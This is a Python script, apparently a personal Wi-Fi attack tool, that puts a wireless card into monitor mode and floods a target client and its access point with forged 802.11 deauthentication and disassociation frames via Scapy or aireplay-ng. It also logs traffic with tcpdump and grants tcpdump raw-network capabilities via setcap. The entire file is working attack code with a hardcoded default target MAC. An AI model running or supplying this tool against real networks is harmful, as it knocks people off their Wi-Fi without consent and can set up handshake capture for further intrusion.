#!/usr/bin/env python3
# desauth.py
# Run: sudo python3 desauth.py
import sys
import subprocess
import time
import os
import re
import signal

from pathlib import Path

from scapy.all import RadioTap, Dot11, Dot11Deauth, Dot11Disas, sendp
from scapy.layers.dot11 import Dot11Action

from element import NetworkInfo  # Your local module

# === Default parameters ===

DEFAULT_TARGET_MAC = "50:91:E3:1C:9B:E4"
FORCED_CHANNEL = 6
USE_SCAPY = True  # True = Scapy ; False = aireplay-ng

# Base directory of the script
BASE_DIR = Path(__file__).resolve().parent

# Capture folder
FILE_DIR = BASE_DIR / "desauthcapture"

TCPDUMP_PATH = "/usr/sbin/tcpdump"
TCPDUMP_CAPS = "cap_net_raw,cap_net_admin=eip"


def run(cmd, check=False, capture=False, text=True):
    """Helper for subprocess.run()."""
    return subprocess.run(
        cmd,
        check=check,
        capture_output=capture,
        text=text,
    )


def ensure_capture_dir_owned_by_user():
    """
    Ensure the desauthcapture/ folder exists and is owned by the current user,
    to avoid the lock icon due to root ownership.
    """
    FILE_DIR.mkdir(exist_ok=True)
    try:
        st = FILE_DIR.stat()
        uid = os.getuid()
        if st.st_uid != uid:
            print(f"[!] '{FILE_DIR}' is not owned by your user. Fixing (sudo chown)...")
            run(["sudo", "chown", "-R", f"{os.getenv('USER')}:{os.getenv('USER')}", str(FILE_DIR)], check=False)
    except Exception:
        print("[!] Unable to verify/change ownership of the capture directory.")
        print("    If you still see a lock, run: sudo chown -R $USER:$USER capture")


def tcpdump_has_caps() -> bool:
    """
    Check whether tcpdump has the required capabilities.
    """
    try:
        res = run(["getcap", TCPDUMP_PATH], capture=True)
        out = (res.stdout or "").strip()
        # Expected example: /usr/sbin/tcpdump cap_net_admin,cap_net_raw=eip
        return "cap_net_raw" in out and "cap_net_admin" in out and "eip" in out
    except FileNotFoundError:
        print("[ERROR] 'getcap' not found. Install libcap2-bin: sudo apt install libcap2-bin")
    except Exception as e:
        print(f"[!] Error checking tcpdump capabilities: {e}")
    return False


def ensure_tcpdump_caps():
    """
    Apply setcap if tcpdump does not have the required capabilities.
    """
    if not os.path.exists(TCPDUMP_PATH):
        print(f"[ERROR] tcpdump not found at: {TCPDUMP_PATH}")
        print("        Find its path with: which tcpdump")
        return

    if tcpdump_has_caps():
        print("[+] tcpdump already has the required capabilities.")
        return

    print("[!] tcpdump does not have the required capabilities.")
    print(f"[+] Applying: sudo setcap {TCPDUMP_CAPS} {TCPDUMP_PATH}")
    try:
        run(["sudo", "setcap", TCPDUMP_CAPS, TCPDUMP_PATH], check=True)
        if tcpdump_has_caps():
            print("[+] tcpdump capabilities OK.")
        else:
            print("[!] setcap executed but capabilities not detected. Verify with: getcap /usr/sbin/tcpdump")
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] setcap failed: {e}")
    except Exception as e:
        print(f"[ERROR] Exception during setcap: {e}")


# === Monitor mode enable/disable ===
def enable_monitor_mode(interface):
    print(f"[+] Enabling monitor mode on {interface}")
    subprocess.call(["sudo", "airmon-ng", "start", interface])


def disable_monitor_mode(interface_mon):
    print(f"[+] Disabling monitor mode on {interface_mon}")
    subprocess.call(["sudo", "airmon-ng", "stop", interface_mon])


def set_channel(interface_mon, channel):
    print(f"[+] Setting {interface_mon} to channel {channel}")
    subprocess.call(["sudo", "iwconfig", interface_mon, "channel", str(channel)])


def wifi_recover(interface):
    print("[+] Recovering Wi-Fi (managed mode + NetworkManager restart)...")

    # 1) force managed mode
    subprocess.call(["sudo", "ip", "link", "set", interface, "down"])
    subprocess.call(["sudo", "iw", interface, "set", "type", "managed"])
    subprocess.call(["sudo", "ip", "link", "set", interface, "up"])

    # 2) restart NetworkManager + wpa_supplicant
    subprocess.call(["sudo", "systemctl", "restart", "NetworkManager"])
    subprocess.call(["sudo", "systemctl", "restart", "wpa_supplicant"])

    # 3) toggle Wi-Fi radio (often helps)
    subprocess.call(["nmcli", "radio", "wifi", "off"])
    time.sleep(1)
    subprocess.call(["nmcli", "radio", "wifi", "on"])


# === Generate a unique .pcap filename ===
def get_next_pcap_name():
    FILE_DIR.mkdir(exist_ok=True)
    existing = [f for f in os.listdir(FILE_DIR) if re.match(r"deauth_capture_\d+\.pcap", f)]
    numbers = [int(re.findall(r"deauth_capture_(\d+)\.pcap", f)[0]) for f in existing]
    next_number = max(numbers) + 1 if numbers else 1
    return FILE_DIR / f"deauth_capture_{next_number}.pcap"


# === Start tcpdump to record packets ===
def start_tcpdump_capture(pcap_file, iface, bssid=""):
    """
    Start tcpdump WITHOUT sudo (thanks to setcap capabilities).
    Optional: apply BSSID filter if provided.
    """
    try:
        print(f"[+] Starting tcpdump capture to {pcap_file}")
        cmd = ["tcpdump", "-i", iface, "-w", str(pcap_file)]

        # Optional filtering (not perfect for 802.11 mgmt frames in monitor mode,
        # but can sometimes be useful).
        if bssid:
            # Simple "ether host" filter (with radiotap/802.11 it may not match as expected)
            cmd += ["ether", "host", bssid]

        return subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        print(f"[!] Error starting tcpdump: {e}")
        return None


# === Stop tcpdump cleanly ===
def stop_tcpdump(proc):
    if proc and proc.poll() is None:
        try:
            proc.terminate()
            proc.wait(timeout=5)
            print("[+] Tcpdump terminated.")
        except Exception:
            try:
                proc.kill()
                print("[+] Tcpdump killed.")
            except Exception as e2:
                print(f"[!] Error stopping tcpdump: {e2}")


# === Send Deauth packets with aireplay-ng ===
def launch_aireplay_deauth(iface_mon, target_mac, ap_mac):
    print(f"[+] Launching aireplay-ng Deauth on channel {FORCED_CHANNEL} (Ctrl+C to stop)")
    proc = None
    try:
        proc = subprocess.Popen(
            ["sudo", "aireplay-ng", "--deauth", "0", "-c", target_mac, "-a", ap_mac, iface_mon],
            preexec_fn=os.setsid  # allows killing the entire process group
        )
        proc.wait()
    except KeyboardInterrupt:
        print("\n[!] Ctrl+C received: stopping aireplay-ng...")
        if proc and proc.poll() is None:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
    return proc


# === Send Deauth packets with Scapy ===
def send_deauth_packets(target_mac, ap_mac, iface_mon, Nbr=2):
    print(f"[+] Sending bidirectional Deauth packets via {iface_mon}")

    pkt_ap_to_client = RadioTap()/Dot11(
        addr1=target_mac,
        addr2=ap_mac,
        addr3=ap_mac
    )/Dot11Deauth(reason=7)

    pkt_client_to_ap = RadioTap()/Dot11(
        addr1=ap_mac,
        addr2=target_mac,
        addr3=target_mac
    )/Dot11Deauth(reason=7)

    try:
        t0 = time.time()
        for i in range(Nbr):
            sendp(pkt_ap_to_client, iface=iface_mon, verbose=0)
            sendp(pkt_client_to_ap, iface=iface_mon, verbose=0)
        t1 = time.time()

        print(f"[+] {i+1} packets sent")
        print(f"Total duration: {t1 - t0:.2f}s")
    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user.")


# === Send Disassociation packets with Scapy ===
def send_disassoc_packets(target_mac, ap_mac, iface_mon, Nbr=2):
    print(f"[+] Sending bidirectional Disassociation packets via {iface_mon}")

    pkt_ap_to_client = RadioTap()/Dot11(
        addr1=target_mac,
        addr2=ap_mac,
        addr3=ap_mac
    )/Dot11Disas(reason=8)

    pkt_client_to_ap = RadioTap()/Dot11(
        addr1=ap_mac,
        addr2=target_mac,
        addr3=target_mac
    )/Dot11Disas(reason=8)

    try:
        t0 = time.time()
        for i in range(Nbr):
            sendp(pkt_ap_to_client, iface=iface_mon, verbose=0)
            sendp(pkt_client_to_ap, iface=iface_mon, verbose=0)

        t1 = time.time()

        print(f"[+] {i+1} packets sent")
        print(f"Total duration: {t1 - t0:.2f}s")

    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user.")


# === Main ===
if __name__ == "__main__":
    info = NetworkInfo.get_wireless_interface_details()

    if not info["interface"] or not info["gateway_mac"]:
        print("[-] No valid Wi-Fi interface or gateway MAC detected.")
        sys.exit(1)

    args = sys.argv[1:]

    # === Argument parsing ===
    if len(args) == 0:
        interface = info["interface"]
        target_mac = DEFAULT_TARGET_MAC
        ap_mac = info["gateway_mac"]
    elif len(args) == 1:
        interface = info["interface"]
        target_mac = args[0]
        ap_mac = info["gateway_mac"]
    elif len(args) == 3:
        interface, target_mac, ap_mac = args
    else:
        print("Usage:")
        print("  sudo python3 layer_@_desauth.py [<interface> <target_mac> <ap_mac>]")
        print("  or:")
        print("  sudo python3 layer_@_desauth.py [<target_mac>]")
        sys.exit(1)

    iface_mon = interface + "mon"
    pcap_file = get_next_pcap_name()
    tcpdump_proc = None

    print("\n Configuration:")
    print(f" - Interface      : {interface}")
    print(f" - Target MAC     : {target_mac}")
    print(f" - AP MAC         : {ap_mac}")
    print(f" - Monitor iface  : {iface_mon}")
    print(f" - Channel        : {FORCED_CHANNEL}")
    print(f" - Mode           : {'SCAPY' if USE_SCAPY else 'AIREPLAY-NG'}")
    print()

    try:
        enable_monitor_mode(interface)
        set_channel(iface_mon, FORCED_CHANNEL)

        # Start tcpdump capture
        tcpdump_proc = start_tcpdump_capture(pcap_file, iface_mon)

        # Launch attack
        if USE_SCAPY:
            send_deauth_packets(target_mac, ap_mac, iface_mon)
            send_disassoc_packets(target_mac, ap_mac, iface_mon)
            time.sleep(20)
            send_deauth_packets(target_mac, ap_mac, iface_mon, 2000)
            send_disassoc_packets(target_mac, ap_mac, iface_mon, 2000)
            time.sleep(20)
        else:
            launch_aireplay_deauth(iface_mon, target_mac, ap_mac)

    finally:
        stop_tcpdump(tcpdump_proc)
        disable_monitor_mode(iface_mon)
        wifi_recover(interface)
